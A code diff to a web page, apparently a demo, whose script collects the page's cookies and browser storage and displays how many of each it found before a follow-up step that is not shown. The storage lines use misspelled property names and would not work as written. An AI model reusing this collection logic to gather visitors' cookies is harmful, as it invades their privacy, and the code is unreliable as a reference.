@@ -64,6 +64,7 @@
 
             <div id="stage2" style="display: none">
                 <h3 class="uk-heading-small">Collection done</h3>
+                <div id="stats"></div>
                 <div>
                     Now it's time to
                     <button
@@ -79,9 +80,15 @@
         <script>
             let data = {};
             function collect() {
-                data.cookies = document.cookie.split(";");
+                data.cookies = document.cookie;
                 data.localstorage = document.localstorage;
                 data.sessionstorage = document.sessionstorage;
+
+                document.getElementById("stats").innerHTML = `
+                    <p>Cookies: ${data.cookies.split(";").length || "none"}</p>
+                    <p>Local Storage: ${data.localstorage?.length || "none"}</p>
+                    <p>Session Storage: ${data.sessionstorage?.length || "none"}</p>
+                `;
 
                 document.getElementById("stage1").style.display = "none";
                 document.getElementById("loading").style.display = "block";
